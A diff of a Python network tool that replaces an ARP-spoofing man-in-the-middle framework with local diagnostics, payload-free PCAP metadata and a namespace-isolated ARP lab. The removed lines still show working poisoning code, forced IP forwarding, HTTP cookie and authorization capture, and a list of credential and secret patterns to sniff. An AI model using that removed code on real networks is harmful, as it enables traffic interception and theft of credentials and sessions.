@@ -1,1020 +1,707 @@
 #!/usr/bin/env python3
-"""
-ARP Spoofing / MITM Framework — MIMic Cross-Platform (Windows / Linux / macOS)
-For authorized penetration testing only.
+"""MIMic: local network diagnostics, offline PCAP metadata, and an isolated ARP lab.
 
-Features:
-  - Bidirectional ARP cache poisoning (victim <-> gateway)
-  - Automatic IP forwarding (Windows: RemoteAccess service / registry, Linux: sysctl)
-  - Real-time packet capture & inspection of forwarded traffic
-  - HTTP request/response capture & logging
-  - Credential sniffing (passwords, tokens, API keys) in cleartext traffic
-  - DNS query interception & logging
-  - Connection tracking (bidirectional flows)
-  - Session hijacking support (cookie capture)
-  - PCAP export of all intercepted traffic
-  - Graceful ARP table restoration on exit
-  - Statistics dashboard (packets/sec, connections, credentials found)
-
-Dependencies:
-  pip install scapy colorama pywin32 (Windows only for service control)
-
-Windows prerequisite:
-  - Npcap from https://npcap.com (WinPcap-compatible mode)
-  - Run as Administrator
-
-Authored by: Tejas Chandola
+The live ARP demonstration is available only through ``--lab``. It creates a
+disposable Linux network namespace topology with no physical network link or
+external route, then removes it on exit. Application payloads are not inspected
+or retained. Use only on systems and networks you are authorized to administer.
 """
 
 import argparse
+import collections
+import json
 import os
 import platform
+import secrets
+import select
+import shutil
 import signal
+import socket
+import subprocess
 import sys
-import time
 import threading
-import json
-from collections import defaultdict, Counter, deque
-from datetime import datetime
+import time
 from pathlib import Path
 
-# ─── Optional color support ───
-try:
-    from colorama import Fore, Back, Style, init
-    init(autoreset=True)
-    HAS_COLORAMA = True
-except ImportError:
-    HAS_COLORAMA = False
-
-# ─── Scapy ───
 try:
     from scapy.all import (
-        ARP, Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw,
-        srp, send, conf, get_if_list, wrpcap, sniff
+        ARP, DNS, Ether, ICMP, IP, TCP, UDP, get_if_list, get_if_hwaddr,
+        sendp, sniff, srp,
     )
-    from scapy.arch import get_windows_if_list
     from scapy.error import Scapy_Exception
-    HAS_SCAPY = True
-except ImportError:
-    HAS_SCAPY = False
-    print("[!] Scapy not installed. Run: pip install scapy")
-    sys.exit(1)
+    from scapy.utils import PcapReader
+    SCAPY_AVAILABLE = True
+    SCAPY_IMPORT_ERROR = None
+except ImportError as exc:
+    ARP = DNS = Ether = ICMP = IP = TCP = UDP = None
+    get_if_list = get_if_hwaddr = sendp = sniff = srp = PcapReader = None
+    Scapy_Exception = Exception
+    SCAPY_AVAILABLE = False
+    SCAPY_IMPORT_ERROR = exc
+except Exception as exc:
+    # Scapy initializes Linux interfaces at import time. In restricted
+    # containers, netlink access can fail even when Scapy is installed.
+    ARP = DNS = Ether = ICMP = IP = TCP = UDP = None
+    get_if_list = get_if_hwaddr = sendp = sniff = srp = PcapReader = None
+    Scapy_Exception = Exception
+    SCAPY_AVAILABLE = False
+    SCAPY_IMPORT_ERROR = exc
 
 
-# ══════════════════════════════════════════════════════════════════════
-# COLOR HELPERS
-# ══════════════════════════════════════════════════════════════════════
-class Color:
-    _enabled = True
-
-    @classmethod
-    def red(cls, text):
-        return f"{Fore.RED}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
-    @classmethod
-    def green(cls, text):
-        return f"{Fore.GREEN}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
-    @classmethod
-    def yellow(cls, text):
-        return f"{Fore.YELLOW}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
-    @classmethod
-    def blue(cls, text):
-        return f"{Fore.BLUE}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
-    @classmethod
-    def magenta(cls, text):
-        return f"{Fore.MAGENTA}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
-    @classmethod
-    def cyan(cls, text):
-        return f"{Fore.CYAN}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
-    @classmethod
-    def bold(cls, text):
-        return f"{Style.BRIGHT}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
-    @classmethod
-    def dim(cls, text):
-        return f"{Style.DIM}{text}{Style.RESET_ALL}" if HAS_COLORAMA and cls._enabled else text
+LAB_TARGET_IP = "198.18.0.2"
+LAB_GATEWAY_IP = "198.18.0.1"
+def require_scapy():
+    if not SCAPY_AVAILABLE:
+        if isinstance(SCAPY_IMPORT_ERROR, ImportError):
+            message = "Scapy is required for this mode. Install it with: python -m pip install scapy"
+        else:
+            message = "Scapy could not access this environment's network interfaces: {}".format(SCAPY_IMPORT_ERROR)
+        raise RuntimeError(message) from SCAPY_IMPORT_ERROR
 
 
-# ══════════════════════════════════════════════════════════════════════
-# ADMIN CHECK (cross-platform)
-# ══════════════════════════════════════════════════════════════════════
+def run_command(command, check=True, timeout=10):
+    """Run a command without a shell and return its completed process."""
+    result = subprocess.run(
+        command, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
+        universal_newlines=True, timeout=timeout,
+    )
+    if check and result.returncode:
+        detail = result.stderr.strip() or result.stdout.strip() or "command failed"
+        raise RuntimeError("{}: {}".format(" ".join(command), detail))
+    return result
+
+
 def is_admin():
+    if hasattr(os, "geteuid"):
+        return os.geteuid() == 0
     if platform.system() == "Windows":
         try:
             import ctypes
             return ctypes.windll.shell32.IsUserAnAdmin() != 0
         except (ImportError, AttributeError, OSError):
             return False
-    else:
+    return False
+
+
+def interface_diagnostics():
+    """Return interface and default-route metadata without changing the host."""
+    interfaces = []
+    default_route = None
+    route_status = "unavailable"
+    notes = []
+
+    if platform.system() == "Linux" and shutil.which("ip"):
         try:
-            return os.geteuid() == 0
-        except AttributeError:
-            return False
-
-
-# ══════════════════════════════════════════════════════════════════════
-# IP FORWARDING (cross-platform)
-# ══════════════════════════════════════════════════════════════════════
-def enable_ip_forwarding():
-    """
-    Enable IP forwarding so intercepted packets reach their destination.
-    Windows: Start the RemoteAccess service (Routing & Remote Access).
-    Linux/macOS: sysctl net.ipv4.ip_forward=1
-    """
-    system = platform.system()
-    if system == "Windows":
+            result = run_command(["ip", "-j", "addr", "show"])
+            for item in json.loads(result.stdout):
+                addresses = []
+                for info in item.get("addr_info", []):
+                    if info.get("family") in ("inet", "inet6"):
+                        addresses.append(info.get("local"))
+                interfaces.append({
+                    "name": item.get("ifname"),
+                    "state": item.get("operstate", "unknown"),
+                    "addresses": addresses,
+                })
+            routes = json.loads(run_command(["ip", "-j", "route", "show", "default"]).stdout)
+            route_status = "found" if routes else "none"
+            if routes:
+                default_route = routes[0]
+        except (RuntimeError, ValueError, OSError) as exc:
+            notes.append("Linux interface/route details unavailable: {}".format(exc))
+    if not interfaces:
         try:
-            # Method 1: netsh (works on most Windows versions)
-            ret = os.system("netsh interface ipv4 set global forwarding=enabled >nul 2>&1")
-            if ret == 0:
-                print(Color.green("  [✓] IP forwarding enabled via netsh"))
-                return True
+            for _, name in socket.if_nameindex():
+                interfaces.append({"name": name, "addresses": []})
+        except OSError as exc:
+            notes.append("Interface enumeration unavailable: {}".format(exc))
 
-            # Method 2: Try starting RemoteAccess service via pywin32
-            try:
-                import win32serviceutil
-                win32serviceutil.StartService("RemoteAccess")
-                print(Color.green("  [✓] RemoteAccess service started (IP forwarding enabled)"))
-                return True
-            except ImportError:
-                pass
+    if SCAPY_AVAILABLE:
+        try:
+            scapy_interfaces = sorted(set(get_if_list()))
+            known = {item.get("name") for item in interfaces}
+            for name in scapy_interfaces:
+                if name not in known:
+                    interfaces.append({"name": name, "addresses": []})
+        except Exception:
+            pass
 
-            # Method 3: Registry (requires reboot but we try anyway)
-            try:
-                import winreg
-                key = winreg.OpenKey(
-                    winreg.HKEY_LOCAL_MACHINE,
-                    r"SYSTEM\CurrentControlSet\Services\Tcpip\Parameters",
-                    0, winreg.KEY_SET_VALUE
+    return {
+        "platform": platform.platform(),
+        "administrator": is_admin(),
+        "scapy_available": SCAPY_AVAILABLE,
+        "scapy_error": str(SCAPY_IMPORT_ERROR) if SCAPY_IMPORT_ERROR else None,
+        "interfaces": interfaces,
+        "default_route": default_route,
+        "default_route_status": route_status,
+        "notes": notes,
+    }
+
+
+def classify_packet(packet):
+    if packet.haslayer(DNS):
+        return "DNS"
+    if packet.haslayer(TCP):
+        return "TCP"
+    if packet.haslayer(UDP):
+        return "UDP"
+    if packet.haslayer(ICMP):
+        return "ICMP"
+    if packet.haslayer(ARP):
+        return "ARP"
+    if packet.haslayer(IP):
+        return "IP"
+    return "Other"
+
+
+def packet_metadata(packet):
+    """Extract headers only. Never return raw/application payload bytes."""
+    info = {
+        "protocol": classify_packet(packet),
+        "bytes": len(packet),
+    }
+    if packet.haslayer(IP):
+        ip = packet[IP]
+        info["src"] = ip.src
+        info["dst"] = ip.dst
+        if packet.haslayer(TCP):
+            info["sport"] = int(packet[TCP].sport)
+            info["dport"] = int(packet[TCP].dport)
+        elif packet.haslayer(UDP):
+            info["sport"] = int(packet[UDP].sport)
+            info["dport"] = int(packet[UDP].dport)
+    if packet.haslayer(DNS):
+        dns = packet[DNS]
+        if dns.qr == 0 and dns.qd:
+            name = dns.qd.qname
+            if isinstance(name, bytes):
+                name = name.decode("utf-8", errors="replace")
+            info["dns_query"] = str(name).rstrip(".")
+    return info
+
+
+def analyze_pcap(filename, max_packets=1000000):
+    require_scapy()
+    counts = collections.Counter()
+    dns_queries = collections.Counter()
+    flows = {}
+    packet_count = 0
+    byte_count = 0
+
+    try:
+        reader = PcapReader(str(filename))
+    except (OSError, ValueError, Scapy_Exception) as exc:
+        raise RuntimeError("Cannot read PCAP '{}': {}".format(filename, exc))
+
+    try:
+        for packet in reader:
+            if packet_count >= max_packets:
+                raise RuntimeError(
+                    "PCAP exceeds the packet limit ({:,}); raise --max-packets to continue.".format(max_packets)
                 )
-                winreg.SetValueEx(key, "IPEnableRouter", 0, winreg.REG_DWORD, 1)
-                winreg.CloseKey(key)
-                print(Color.yellow("  [!] Registry updated (IPEnableRouter=1). A reboot may be needed for full effect."))
-                # Still try netsh to apply immediately
-                os.system("netsh interface ipv4 set global forwarding=enabled >nul 2>&1")
-                return True
-            except Exception as e:
-                print(Color.yellow(f"  [!] Registry method failed: {e}"))
+            packet_count += 1
+            meta = packet_metadata(packet)
+            byte_count += meta["bytes"]
+            counts[meta["protocol"]] += 1
+            if "dns_query" in meta:
+                dns_queries[meta["dns_query"]] += 1
+            if "src" in meta:
+                key = (meta["src"], meta["dst"], meta.get("sport", 0), meta.get("dport", 0), meta["protocol"])
+                if key not in flows:
+                    flows[key] = {"packets": 0, "bytes": 0}
+                flows[key]["packets"] += 1
+                flows[key]["bytes"] += meta["bytes"]
+    finally:
+        reader.close()
+
+    top_flows = sorted(
+        flows.items(), key=lambda item: (item[1]["packets"], item[1]["bytes"]), reverse=True
+    )[:20]
+    return {
+        "file": str(Path(filename).resolve()),
+        "packets": packet_count,
+        "bytes": byte_count,
+        "protocols": dict(counts.most_common()),
+        "dns_queries": [
+            {"name": name, "count": count}
+            for name, count in dns_queries.most_common(50)
+        ],
+        "top_flows": [
+            {
+                "src": key[0], "dst": key[1], "sport": key[2], "dport": key[3],
+                "protocol": key[4], **stats,
+            }
+            for key, stats in top_flows
+        ],
+        "payloads_decoded_or_saved": False,
+    }
+
+
+class LabTopology:
+    """Creates an isolated bridge and three disposable network namespaces."""
+
+    def __init__(self):
+        suffix = secrets.token_hex(3)
+        self.bridge = "mbr" + suffix
+        self.attacker = "mimic-a-" + suffix
+        self.target = "mimic-t-" + suffix
+        self.gateway = "mimic-g-" + suffix
+        self.host_links = ["mh0" + suffix, "mh1" + suffix, "mh2" + suffix]
+        self.namespaces = [self.attacker, self.target, self.gateway]
+        self.created_bridge = False
+        self.created_namespaces = []
+        self.created_host_links = []
+        self.ip = shutil.which("ip")
+        if not self.ip:
+            raise RuntimeError("Linux iproute2 ('ip') is required for --lab.")
+
+    def _ip(self, *args, check=True):
+        return run_command([self.ip] + list(args), check=check)
+
+    def create(self):
+        if platform.system() != "Linux":
+            raise RuntimeError("The live isolated lab is available on Linux only.")
+        if not is_admin():
+            raise RuntimeError("--lab requires root privileges to create disposable network namespaces.")
+        require_scapy()
+
+        try:
+            for namespace in self.namespaces:
+                self._ip("netns", "add", namespace)
+                self.created_namespaces.append(namespace)
+
+            self._ip("link", "add", self.bridge, "type", "bridge")
+            self.created_bridge = True
+            self._ip("link", "set", self.bridge, "up")
+
+            namespace_ips = ["198.18.0.3/24", LAB_TARGET_IP + "/24", LAB_GATEWAY_IP + "/24"]
+            for namespace, host_link, address in zip(self.namespaces, self.host_links, namespace_ips):
+                peer = "mp" + secrets.token_hex(3)
+                self._ip("link", "add", host_link, "type", "veth", "peer", "name", peer)
+                self.created_host_links.append(host_link)
+                self._ip("link", "set", peer, "netns", namespace)
+                self._ip("link", "set", host_link, "master", self.bridge)
+                self._ip("link", "set", host_link, "up")
+                self._ip("-n", namespace, "link", "set", peer, "name", "eth0")
+                self._ip("-n", namespace, "link", "set", "lo", "up")
+                self._ip("-n", namespace, "addr", "add", address, "dev", "eth0")
+                self._ip("-n", namespace, "link", "set", "eth0", "up")
+
+            self._verify_isolation()
+            self._ip("netns", "exec", self.attacker, "sysctl", "-q", "-w", "net.ipv4.ip_forward=1")
+            self._ip("netns", "exec", self.attacker, "sysctl", "-q", "-w", "net.ipv4.conf.all.rp_filter=0")
+            self._ip("netns", "exec", self.attacker, "sysctl", "-q", "-w", "net.ipv4.conf.eth0.rp_filter=0")
+        except Exception:
+            self.cleanup()
+            raise
+
+    def _verify_isolation(self):
+        bridge_ports = json.loads(self._ip("-j", "link", "show", "master", self.bridge).stdout)
+        expected_ports = set(self.host_links)
+        actual_ports = {item.get("ifname") for item in bridge_ports}
+        if actual_ports != expected_ports:
+            raise RuntimeError("Lab bridge has unexpected ports; refusing to run ARP traffic.")
+
+        for namespace, expected_ip in zip(
+            self.namespaces, ["198.18.0.3", "198.18.0.2", "198.18.0.1"]
+        ):
+            links = json.loads(self._ip("-n", namespace, "-j", "link", "show").stdout)
+            if {item.get("ifname") for item in links} != {"lo", "eth0"}:
+                raise RuntimeError("Unexpected interface in lab namespace {}; refusing to continue.".format(namespace))
+            routes = json.loads(self._ip("-n", namespace, "-j", "route", "show").stdout)
+            if any(route.get("dst") == "default" for route in routes):
+                raise RuntimeError("A lab namespace has an external route; refusing to continue.")
+            addresses = json.loads(self._ip("-n", namespace, "-j", "addr", "show", "dev", "eth0").stdout)
+            found = {
+                item.get("local") for link in addresses
+                for item in link.get("addr_info", []) if item.get("family") == "inet"
+            }
+            if found != {expected_ip}:
+                raise RuntimeError("Unexpected address in lab namespace {}; refusing to continue.".format(namespace))
+
+    def verify_arp_restored(self, target_mac, gateway_mac):
+        checks = [
+            (self.target, LAB_GATEWAY_IP, gateway_mac.lower()),
+            (self.gateway, LAB_TARGET_IP, target_mac.lower()),
+        ]
+        for namespace, address, expected_mac in checks:
+            result = self._ip("-n", namespace, "-j", "neigh", "show", "to", address, check=False)
+            if result.returncode:
                 return False
-
-        except Exception as e:
-            print(Color.red(f"  [✗] Failed to enable IP forwarding: {e}"))
-            print(Color.yellow("  [!] You must manually enable IP routing:"))
-            print(Color.yellow("      Run as Admin: netsh interface ipv4 set global forwarding=enabled"))
-            return False
-
-    else:
-        # Linux / macOS
-        try:
-            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                f.write("1")
-            print(Color.green("  [✓] IP forwarding enabled"))
-            return True
-        except (FileNotFoundError, PermissionError, IOError):
-            ret = os.system("sysctl -w net.inet.ip.forwarding=1 >/dev/null 2>&1") if system == "Darwin" else -1
-            if ret == 0:
-                print(Color.green("  [✓] IP forwarding enabled"))
-                return True
-            print(Color.red("  [✗] Failed to enable IP forwarding. Use: sysctl -w net.inet.ip.forwarding=1"))
-            return False
-
-
-def disable_ip_forwarding():
-    """Restore IP forwarding to disabled state."""
-    system = platform.system()
-    if system == "Windows":
-        os.system("netsh interface ipv4 set global forwarding=disabled >nul 2>&1")
-        try:
-            import win32serviceutil
-            win32serviceutil.StopService("RemoteAccess")
-        except Exception:
-            pass
-        print(Color.dim("  [*] IP forwarding disabled"))
-    else:
-        try:
-            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-                f.write("0")
-        except Exception:
-            os.system("sysctl -w net.inet.ip.forwarding=0 >/dev/null 2>&1")
-
-
-# ══════════════════════════════════════════════════════════════════════
-# MAC ADDRESS RESOLUTION
-# ══════════════════════════════════════════════════════════════════════
-def get_mac(ip_address, iface=None, retries=3):
-    """
-    Resolve MAC address for a given IP on the local network.
-    Sends an ARP who-has request and waits for the reply.
-    Returns MAC as string or None.
-    """
-    for attempt in range(retries):
-        try:
-            arp_req = ARP(pdst=ip_address)
-            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-            packet = broadcast / arp_req
-
-            kwargs = {"timeout": 2, "verbose": False}
-            if iface:
-                kwargs["iface"] = iface
-
-            ans, unans = srp(packet, **kwargs)
-
-            if ans:
-                return ans[0][1].hwsrc.strip()
-
-            if attempt < retries - 1:
-                time.sleep(0.5)
-        except Exception as e:
-            if attempt < retries - 1:
-                time.sleep(0.5)
-            else:
-                print(Color.yellow(f"  [!] MAC resolution failed for {ip_address}: {e}"))
-    return None
-
-
-# ══════════════════════════════════════════════════════════════════════
-# CREDENTIAL DETECTION (shared from packet sniffer)
-# ══════════════════════════════════════════════════════════════════════
-CREDENTIAL_PATTERNS = [
-    (b"password", "password"),
-    (b"passwd", "passwd"),
-    (b"login", "login"),
-    (b"username", "username"),
-    (b"user=", "user="),
-    (b"authorization", "authorization"),
-    (b"api_key", "api_key"),
-    (b"apikey", "apikey"),
-    (b"secret", "secret"),
-    (b"token", "token"),
-    (b"bearer ", "Bearer token"),
-    (b"jwt", "JWT"),
-    (b"session", "session"),
-    (b"cookie", "cookie"),
-    (b"auth", "auth"),
-    (b"grant_type", "grant_type"),
-    (b"client_id", "client_id"),
-    (b"client_secret", "client_secret"),
-    (b"access_token", "access_token"),
-    (b"X-API-Key", "X-API-Key"),
-    (b"X-Auth-Token", "X-Auth-Token"),
-    (b"AWS", "AWS key pattern"),
-    (b"AKIA", "AWS Access Key"),
-    (b"-----BEGIN", "Private key"),
-    (b"ssh-rsa", "SSH public key"),
-    (b"ghp_", "GitHub PAT"),
-    (b"xoxb-", "Slack bot token"),
-    (b"sk_live_", "Stripe live secret"),
-    (b"sk_test_", "Stripe test secret"),
-]
-
-def analyze_payload(raw_bytes):
-    """Scan for credentials/secrets in raw payload bytes."""
-    findings = []
-    if not raw_bytes:
-        return findings
-    lower = raw_bytes.lower()
-    for pattern_bytes, label in CREDENTIAL_PATTERNS:
-        idx = lower.find(pattern_bytes)
-        if idx != -1:
-            start = max(0, idx - 20)
-            end = min(len(raw_bytes), idx + len(pattern_bytes) + 40)
-            context = raw_bytes[start:end]
             try:
-                ctx_str = context.decode("utf-8", errors="replace").replace("\r", "").replace("\n", " ")
-            except Exception:
-                ctx_str = repr(context)
-            severity = "HIGH" if any(k in label.lower() for k in ["secret", "key", "token", "password"]) else "MEDIUM"
-            findings.append({"pattern": label, "": label, "context": ctx_str.strip(), "severity": severity})
-    return findings
+                neighbors = json.loads(result.stdout)
+            except ValueError:
+                return False
+            if not any(item.get("lladdr", "").lower() == expected_mac for item in neighbors):
+                return False
+        return True
 
-
-# ══════════════════════════════════════════════════════════════════════
-# ARP SPOOFER ENGINE
-# ══════════════════════════════════════════════════════════════════════
-class ARPSpoofer:
-    """
-    Handles bidirectional ARP cache poisoning between a victim and a gateway
-    (or any two hosts). Continuously sends forged ARP replies to keep
-    the poison active.
-    """
-
-    def __init__(self, target_ip, gateway_ip, iface=None, interval=2.0):
-        self.target_ip = target_ip
-        self.gateway_ip = gateway_ip
-        self.iface = iface
-        self.interval = interval
-        self.running = False
-        self.poison_thread = None
-
-        # Resolve MAC addresses
-        print(f"\n  [*] Resolving MAC addresses...")
-        self.attacker_mac = self._get_attacker_mac()
-        if not self.attacker_mac:
-            print(Color.red("  [✗] Could not determine attacker MAC address"))
-            sys.exit(1)
-        print(f"      Attacker MAC : {self.attacker_mac}")
-
-        self.target_mac = get_mac(self.target_ip, iface=self.iface)
-        if not self.target_mac:
-            print(Color.red(f"  [✗] Could not resolve MAC for target {self.target_ip}"))
-            print(Color.yellow("      Is the target online and reachable?"))
-            sys.exit(1)
-        print(f"      Target MAC   : {self.target_mac} ({self.target_ip})")
-
-        self.gateway_mac = get_mac(self.gateway_ip, iface=self.iface)
-        if not self.gateway_mac:
-            print(Color.red(f"  [✗] Could not resolve MAC for gateway {self.gateway_ip}"))
-            sys.exit(1)
-        print(f"      Gateway MAC  : {self.gateway_mac} ({self.gateway_ip})")
-
-        # Store original mappings for restoration
-        self.target_gateway_map = self.gateway_mac  # what target thinks gateway is
-        self.gateway_target_map = self.target_mac  # what gateway thinks target is
-
-    @staticmethod
-    def _get_attacker_mac():
-        """Get the MAC address of our interface."""
+    def run_worker(self):
+        """Start the private worker inside the freshly created attacker namespace."""
+        script = str(Path(__file__).resolve())
+        proc = subprocess.Popen(
+            [self.ip, "netns", "exec", self.attacker, sys.executable, "-u", script,
+             "--_lab-worker", "--_expected-namespace", str(os.stat(
+                 "/var/run/netns/" + self.attacker
+             ).st_ino)],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
+            universal_newlines=True, bufsize=1,
+        )
         try:
-            if platform.system() == "Windows":
-                ifaces = get_windows_if_list()
-                for iface in ifaces:
-                    mac = iface.get("mac", "")
-                    if mac and mac != "00:00:00:00:00:00":
-                        return mac
-            # Fallback
-            from scapy.arch import get_if_raw_hwaddr
-            for iface_name in get_if_list():
-                try:
-                    mac = get_if_raw_hwaddr(iface_name)[1]
-                    mac_str = ":".join(f"{b:02x}" for b in mac)
-                    if mac_str != "00:00:00:00:00:00":
-                        return mac_str
-                except Exception:
-                    continue
-        except Exception:
-            pass
-        return None
-
-    def _send_arp(self, target_ip, target_mac, spoofed_ip):
-        """
-        Send a forged ARP reply (op=2) to 'target_ip' claiming that
-        'spoofed_ip' has our MAC address.
-        """
-        try:
-            packet = Ether(dst=target_mac) / ARP(
-                op=2,
-                pdst=target_ip,
-                hwdst=target_mac,
-                psrc=spoofed_ip,
-                hwsrc=self.attacker_mac
+            ready, _, _ = select.select([proc.stdout], [], [], 10)
+            if not ready:
+                raise RuntimeError("The isolated ARP lab worker did not start in time.")
+            line = proc.stdout.readline().strip()
+            if not line.startswith("LAB_READY "):
+                raise RuntimeError("The lab worker failed to start: " + (line or "no status received"))
+            print("  Lab worker: {}".format(line[len("LAB_READY "):]))
+            self.worker_macs = dict(
+                part.split("=", 1) for part in line[len("LAB_READY "):].split()
+                if "=" in part
             )
-            kwargs = {"verbose": False}
-            if self.iface:
-                kwargs["iface"] = self.iface
-            send(packet, **kwargs)
-        except Exception as e:
-            print(Color.red(f"  [!] ARP send error: {e}"))
+            return proc
+        except Exception:
+            if proc.poll() is None:
+                proc.terminate()
+                try:
+                    proc.wait(timeout=3)
+                except subprocess.TimeoutExpired:
+                    proc.kill()
+                    proc.wait()
+            remaining = proc.stdout.read() if proc.stdout else ""
+            if remaining.strip():
+                print(remaining.rstrip())
+            raise
 
-    def poison(self):
-        """
-        Start bidirectional poisoning in a loop.
-        Tells the target that we are the gateway.
-        Tells the gateway that we are the target.
-        """
-        self.running = True
-        packet_count = 0
-        print(Color.green(f"\n  [→] ARP poisoning started (interval={self.interval}s)"))
-        print(f"      Target  : {self.target_ip} ← → {self.attacker_mac} (us)")
-        print(f"      Gateway : {self.gateway_ip} ← → {self.attacker_mac} (us)")
-        print(f"      {'─' * 50}")
-
-        while self.running:
-            self._send_arp(self.target_ip, self.target_mac, self.gateway_ip)
-            self._send_arp(self.gateway_ip, self.gateway_mac, self.target_ip)
-            packet_count += 2
-            if packet_count % 10 == 0:
-                print(Color.dim(f"      [{packet_count}] Poison packets sent..."))
-            time.sleep(self.interval)
-
-    def start_poisoning(self):
-        """Launch poisoning in a background thread."""
-        self.poison_thread = threading.Thread(target=self.poison, daemon=True)
-        self.poison_thread.daemon = True
-        self.poison_thread.start()
-        return self.poison_thread
-
-    def stop_poisoning(self):
-        """Stop sending forged ARP packets."""
-        self.running = False
-        if self.poison_thread:
-            self.poison_thread.join(timeout=3)
-        print(Color.yellow("\n  [*] ARP poisoning stopped"))
-
-    def restore_arp(self):
-        """
-        Restore ARP tables to their original state.
-        Sends correct ARP replies to both target and gateway.
-        """
-        print(Color.yellow("  [*] Restoring ARP tables..."))
-
-        # Tell target the real gateway MAC
-        pkt = Ether(dst=self.target_mac) / ARP(
-            op=2,
-            pdst=self.target_ip,
-            hwdst=self.target_mac,
-            psrc=self.gateway_ip,
-            hwsrc=self.gateway_mac
+    def generate_test_traffic(self):
+        ping = shutil.which("ping")
+        if not ping:
+            raise RuntimeError("The Linux 'ping' utility is required to generate lab test traffic.")
+        print("  Generating four ICMP echo requests from the target namespace...")
+        result = self._ip(
+            "netns", "exec", self.target, ping, "-n", "-c", "4", "-W", "1", LAB_GATEWAY_IP,
+            check=False, timeout=10,
         )
-        # Tell gateway the real target MAC
-        pkt2 = Ether(dst=self.gateway_mac) / ARP(
-            op=2,
-            pdst=self.gateway_ip,
-            hwdst=self.gateway_mac,
-            psrc=self.target_ip,
-            hwsrc=self.target_mac
-        )
+        if result.stdout.strip():
+            print(result.stdout.strip())
+        if result.returncode:
+            raise RuntimeError("Synthetic lab traffic did not complete successfully.")
 
-        for _ in range(3):
-            send(pkt, verbose=False)
-            send(pkt2, verbose=False)
-            time.sleep(0.5)
+    def cleanup(self):
+        for namespace in reversed(self.created_namespaces):
+            self._ip("netns", "del", namespace, check=False)
+        self.created_namespaces = []
+        for link in self.created_host_links:
+            self._ip("link", "del", link, check=False)
+        self.created_host_links = []
+        if self.created_bridge:
+            self._ip("link", "del", self.bridge, check=False)
+            self.created_bridge = False
 
-        print(Color.green("  [✓] ARP tables restored"))
 
-
-# ══════════════════════════════════════════════════════════════════════
-# MITM PACKET CAPTURE & ANALYZER
-# ══════════════════════════════════════════════════════════════════════
-class MITMAnalyzer:
-    """
-    Captures and analyzes traffic flowing through the MITM position.
-    Extracts HTTP requests/responses, credentials, DNS queries,
-    connection statistics, and saves PCAPs.
-    """
-
-    def __init__(self, target_ip, gateway_ip, iface=None,
-                 pcap_out=None, show_http=False, show_creds=True,
-                 json_output=False, verbose=False):
-        self.target_ip = target_ip
-        self.gateway_ip = gateway_ip
-        self.iface = iface
-        self.pcap_out = pcap_out
-        self.show_http = show_http
-        self.show_creds = show_creds
-        self.json_output = json_output
-        self.verbose = verbose
-
-        self.packets_captured = 0
-        self.credentials_found = []
-        self.http_requests = []
-        self.http_responses = []
-        self.dns_queries = []
-        self.connections = defaultdict(lambda: {"packets": 0, "bytes": 0, "src": "", "dst": "", "sport": 0, "dport": 0})
-        self.pcap_buffer = []
-        self.start_time = time.time()
+class LabMetadata:
+    def __init__(self):
+        self.packets = 0
+        self.bytes = 0
+        self.protocols = collections.Counter()
+        self.flows = {}
         self.lock = threading.Lock()
 
-        # Stats
-        self.bandwidth_window = deque(maxlen=500)
-        self.protocol = Counter()
-        self.current_bps = 0.0
-        self.current_pps = 0.0
-
-    def _classify(self, packet):
-        """Quick packet classification."""
-        if packet.haslayer(TCP):
-            dport = packet[TCP].dport
-            sport = packet[TCP].sport
-            if dport == 80 or sport == 80:
-                return "HTTP"
-            if dport == 443 or sport == 443:
-                return "HTTPS"
-            if dport == 22 or sport == 22:
-                return "SSH"
-            if dport == 21 or sport == 21:
-                return "FTP"
-            if dport == 25 or sport == 25:
-                return "SMTP"
-            if dport == 110 or sport == 110:
-                return "POP3"
-            if dport == 143 or sport == 143:
-                return "IMAP"
-            if dport == 3306 or sport == 3306:
-                return "MySQL"
-            if dport == 5432 or sport == 5432:
-                return "PostgreSQL"
-            return "TCP"
-        if packet.haslayer(UDP):
-            dport = packet[UDP].dport
-            sport = packet[UDP].sport
-            if dport == 53 or sport == 53:
-                return "DNS"
-            if dport == 67 or dport == 68:
-                return "DHCP"
-            if dport == 123 or sport == 123:
-                return "NTP"
-            return "UDP"
-        if packet.haslayer(ICMP):
-            return "ICMP"
-        return "Other"
-
-    def _extract_http(self, packet):
-        """Extract HTTP request/response from raw TCP payload."""
-        http_info = {}
-        if packet.haslayer(Raw) and packet.haslayer(TCP):
-            raw = packet[Raw].load
-            try:
-                text = raw.decode("utf-8", errors="replace")
-
-                # HTTP Request
-                if text.startswith(("GET ", "POST ", "PUT ", "DELETE ", "PATCH ", "HEAD ", "OPTIONS ")):
-                    lines = text.split("\r\n")
-                    request_line = lines[0] if lines else ""
-                    http_info["type"] = "request"
-                    http_info["request_line"] = request_line
-                    headers = {}
-                    for line in lines[1:]:
-                        if ": " in line:
-                            k, v = line.split(": ", 1)
-                            headers[k.lower()] = v
-                        else:
-                            break
-                    if "host" in headers:
-                        http_info["host"] = headers["host"]
-                    if "cookie" in headers:
-                        http_info["cookie"] = headers["cookie"][:120]
-                    if "authorization" in headers:
-                        http_info["authorization"] = headers["authorization"][:60]
-                    if "user-agent" in headers:
-                        http_info["user_agent"] = headers["user_agent"]
-                    if "content-type" in headers:
-                        http_info["content_type"] = headers["content_type"]
-                    http_info["body_preview"] = text.split("\r\n\r\n")[1][:200] if "\r\n\r\n" in text else ""
-
-                # HTTP Response
-                elif text.startswith("HTTP/"):
-                    lines = text.split("\r\n")
-                    http_info["type"] = "response"
-                    http_info["status_line"] = lines[0] if lines else ""
-                    headers = {}
-                    for line in lines[1:]:
-                        if ": " in line:
-                            k, v = line.split(": ", 1)
-                            headers[k.lower()] = v
-                        else:
-                            break
-                    if "server" in headers:
-                        http_info["server"] = headers["server"]
-                    if "set-cookie" in headers:
-                        http_info["set_cookie"] = headers["set-cookie"][:120]
